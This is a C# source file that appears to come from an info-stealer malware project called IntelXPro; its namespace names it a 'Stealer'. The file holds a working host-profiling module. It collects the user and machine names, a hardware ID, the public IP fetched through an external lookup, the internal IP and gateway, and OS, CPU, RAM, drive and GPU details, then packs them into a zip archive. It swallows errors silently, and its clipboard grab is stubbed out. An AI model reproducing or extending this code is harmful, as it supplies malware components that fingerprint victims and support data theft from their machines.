using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.General;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Device
{
    internal class SystemInfo : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.AppendLine("IntelXPro");
                Task<string> task = Task.Run(() => BuildUserSection());
                Task<string> task2 = Task.Run(() => BuildNetworkSection());
                Task<string> task3 = Task.Run(() => BuildSystemSection());
                Task<string> task4 = Task.Run(() => BuildDrivesSection());
                Task<string> task5 = Task.Run(() => BuildGpuSection());
                Task<string> task6 = Task.Run(() => BuildBasicSection());
                Task.WaitAll(task, task2, task3, task4, task5, task6);
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2.Append(stringBuilder);
                stringBuilder2.AppendLine(task.Result).AppendLine();
                stringBuilder2.AppendLine(task2.Result).AppendLine();
                stringBuilder2.AppendLine(task3.Result).AppendLine();
                stringBuilder2.AppendLine(task4.Result).AppendLine();
                stringBuilder2.AppendLine(task5.Result).AppendLine();
                stringBuilder2.AppendLine(task6.Result);
                zip.AddTextFile("Information.txt", stringBuilder2.ToString());
            }
            catch
            {
            }
        }

        private static string BuildUserSection()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("[User Info]");
            try
            {
                stringBuilder.AppendLine("User: " + Environment.UserName);
                stringBuilder.AppendLine("Machine: " + Environment.MachineName);
                stringBuilder.AppendLine($"Now: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            }
            catch
            {
                stringBuilder.AppendLine("User/System fields unavailable");
            }
            try
            {
                string text = CultureInfo.CurrentCulture.TwoLetterISOLanguageName ?? "unknown";
                stringBuilder.AppendLine("Input ISO: " + text);
            }
            catch
            {
                stringBuilder.AppendLine("Input ISO: unknown");
            }
            stringBuilder.AppendLine("Hwid: " + HwidGenerator.GetHwid());
            stringBuilder.AppendLine("Clipboard: " + GetClipboardTextNoTimeout());
            return stringBuilder.ToString().TrimEnd();
        }

        private static string BuildNetworkSection()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("[Network]");
            stringBuilder.AppendLine("External IP: " + IpApi.GetPublicIp());
            string text = "unavailable";
            string text2 = "unavailable";
            try
            {
                NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface networkInterface in allNetworkInterfaces)
                {
                    if (networkInterface.OperationalStatus != OperationalStatus.Up || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Loopback)
                    {
                        continue;
                    }
                    IPInterfaceProperties iPProperties = networkInterface.GetIPProperties();
                    foreach (UnicastIPAddressInformation unicastAddress in iPProperties.UnicastAddresses)
                    {
                        if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            text = unicastAddress.Address.ToString();
                            break;
                        }
                    }
                    foreach (GatewayIPAddressInformation gatewayAddress in iPProperties.GatewayAddresses)
                    {
                        if (gatewayAddress.Address != null && gatewayAddress.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            text2 = gatewayAddress.Address.ToString();
                            break;
                        }
                    }
                    if (text != "unavailable" && text2 != "unavailable")
                    {
                        break;
                    }
                }
            }
            catch
            {
            }
            stringBuilder.AppendLine("Internal IP: " + text);
            stringBuilder.AppendLine("Default Gateway: " + text2);
            return stringBuilder.ToString().TrimEnd();
        }

        private static string BuildSystemSection()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("[System]");
            try
            {
                stringBuilder.AppendLine("OS Product: " + WindowsInfo.GetProductName());
                stringBuilder.AppendLine("OS Build: " + WindowsInfo.GetBuildNumber());
                stringBuilder.AppendLine("OS Arch: " + WindowsInfo.GetArchitecture());
            }
            catch
            {
                stringBuilder.AppendLine("OS: unavailable");
            }
            try
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"))
                {
                    string text = (registryKey?.GetValue("ProcessorNameString") as string) ?? (registryKey?.GetValue("VendorIdentifier") as string) ?? "Unknown";
                    stringBuilder.AppendLine("CPU Name: " + text);
                    stringBuilder.AppendLine($"Logical Cores: {Environment.ProcessorCount}");
                }
            }
            catch
            {
                stringBuilder.AppendLine("CPU: unavailable");
            }
            try
            {
                NativeMethods.MEMORYSTATUSEX lpBuffer = new NativeMethods.MEMORYSTATUSEX
                {
                    dwLength = (uint)Marshal.SizeOf(typeof(NativeMethods.MEMORYSTATUSEX))
                };
                if (NativeMethods.GlobalMemoryStatusEx(ref lpBuffer))
                {
                    ulong num = lpBuffer.ullTotalPhys / 1024 / 1024;
                    ulong num2 = lpBuffer.ullAvailPhys / 1024 / 1024;
                    stringBuilder.AppendLine($"RAM Total (MB): {num}");
                    stringBuilder.AppendLine($"RAM Available (MB): {num2}");
                }
                else
                {
                    stringBuilder.AppendLine("RAM: unavailable");
                }
            }
            catch
            {
                stringBuilder.AppendLine("RAM: unavailable");
            }
            return stringBuilder.ToString().TrimEnd();
        }

        private static string BuildDrivesSection()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("[Drives]");
            try
            {
                List<string> list = (from d in DriveInfo.GetDrives()
                                     where d.IsReady
                                     select d).Select(delegate (DriveInfo d)
                                     {
                                         long num = d.TotalSize / 1024 / 1024 / 1024;
                                         long num2 = d.TotalFreeSpace / 1024 / 1024 / 1024;
                                         return $"{d.Name.TrimEnd('\\')} {d.DriveType} FS:{d.DriveFormat} Size:{num}GB Free:{num2}GB";
                                     }).ToList();
                if (list.Any())
                {
                    foreach (string item in list)
                    {
                        stringBuilder.AppendLine(item);
                    }
                }
                else
                {
                    stringBuilder.AppendLine("No ready drives");
                }
            }
            catch
            {
                stringBuilder.AppendLine("Drives: unavailable");
            }
            return stringBuilder.ToString().TrimEnd();
        }

        private static string BuildGpuSection()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("[GPU]");
            try
            {
                List<string> gpuNames = GetGpuNames();
                if (gpuNames.Any())
                {
                    foreach (string item in gpuNames)
                    {
                        stringBuilder.AppendLine(item);
                    }
                }
                else
                {
                    stringBuilder.AppendLine("None");
                }
            }
            catch
            {
                stringBuilder.AppendLine("GPUs: unavailable");
            }
            return stringBuilder.ToString().TrimEnd();
        }

        private static string BuildBasicSection()
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("[Basic]");
            try
            {
                stringBuilder.AppendLine("User Domain: " + Environment.UserDomainName);
            }
            catch
            {
                stringBuilder.AppendLine("User Domain: unavailable");
            }
            try
            {
                stringBuilder.AppendLine($"CLR Version: {Environment.Version}");
            }
            catch
            {
                stringBuilder.AppendLine("CLR Version: unavailable");
            }
            return stringBuilder.ToString().TrimEnd();
        }

        private static string GetClipboardTextNoTimeout()
        {
            string result = string.Empty;
            try
            {
                Thread thread = new Thread((ThreadStart)delegate
                {
                    try
                    {
                        result = "Clipboard access not available";
                    }
                    catch
                    {
                    }
                });
                thread.SetApartmentState(ApartmentState.STA);
                thread.IsBackground = true;
                thread.Start();
                thread.Join();
            }
            catch
            {
            }
            return result ?? string.Empty;
        }

        private static List<string> GetGpuNames()
        {
            List<string> list = new List<string>();
            try
            {
                uint num = 0u;
                NativeMethods.DISPLAY_DEVICE lpDisplayDevice = default(NativeMethods.DISPLAY_DEVICE);
                lpDisplayDevice.cb = Marshal.SizeOf(lpDisplayDevice);
                while (NativeMethods.EnumDisplayDevices(null, num, ref lpDisplayDevice, 0u))
                {
                    if (!string.IsNullOrWhiteSpace(lpDisplayDevice.DeviceString))
                    {
                        list.Add(lpDisplayDevice.DeviceString.Trim());
                    }
                    num++;
                    lpDisplayDevice = new NativeMethods.DISPLAY_DEVICE
                    {
                        cb = Marshal.SizeOf(typeof(NativeMethods.DISPLAY_DEVICE))
                    };
                }
            }
            catch
            {
            }
            return list.Distinct().ToList();
        }
    }
}
